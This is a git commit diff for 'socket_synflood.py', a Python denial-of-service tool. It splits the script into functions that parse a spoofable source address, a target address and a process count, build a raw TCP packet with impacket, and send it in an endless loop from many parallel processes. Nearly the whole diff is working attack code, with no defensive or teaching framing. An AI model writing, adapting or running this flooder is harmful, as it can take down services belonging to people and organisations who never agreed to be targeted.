6b03e497491f8c0a429794fd737302047b02589f
zenyanbo <34698908+zenyanbo@users.noreply.github.com>
2021-01-12 23:16:47 +0800

    Update socket_synflood.py

--- socket_synflood.py
+++ socket_synflood.py
@@ -6,8 +6,20 @@ import random
 import multiprocessing
 import sys
 
-def synflood(src_ip,src_port,dst_ip,dst_port):
-    #loop = asyncio.get_running_loop()
+def parameter():
+    global src_ip,src_port,dst_ip,dst_port,thread_count
+    if len(sys.argv) != 6:
+        print("参数错误")
+        sys.exit()
+    src_ip = sys.argv[1]
+    src_port = int(sys.argv[2])
+    dst_ip = sys.argv[3]
+    dst_port = int(sys.argv[4])
+    thread_count = int(sys.argv[5])
+
+def packet():
+    parameter()
+    global s,ip,dst_ip,dst_port
     s = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_RAW)
     ip = impacket.ImpactPacket.IP()
     tcp = impacket.ImpactPacket.TCP()
@@ -21,28 +33,16 @@ def synflood(src_ip,src_port,dst_ip,dst_port):
     tcp.set_th_seq(22903)
     tcp.set_th_win(20000)#设置Window Size
     ip.contains(tcp)
-    ip.calculate_checksum()
+    ip.calculate_checksum()   
+
+def synflood():
     for _ in repeat(None):
         s.sendto(ip.get_packet(),(dst_ip,dst_port))
 
-#def asynflood(src_ip,src_port,dst_ip,dst_port):
-        #asyncio.run(synFlood(src_ip,src_port,dst_ip,dst_port))
-
-def parameter():
-    global src_ip,src_port,dst_ip,dst_port,thread_count
-    if len(sys.argv) != 6:
-        print("参数错误")
-        sys.exit()
-    src_ip = sys.argv[1]
-    src_port = int(sys.argv[2])
-    dst_ip = sys.argv[3]
-    dst_port = int(sys.argv[4])
-    thread_count = int(sys.argv[5])
-
 if __name__=='__main__':
-    parameter()
+    packet()
     pros=[]
     for _ in range(thread_count):
-        pros.append(multiprocessing.Process(target=synflood,args=(src_ip,src_port,dst_ip,dst_port)))
+        pros.append(multiprocessing.Process(target=synflood))
     for pro in pros:
         pro.start()
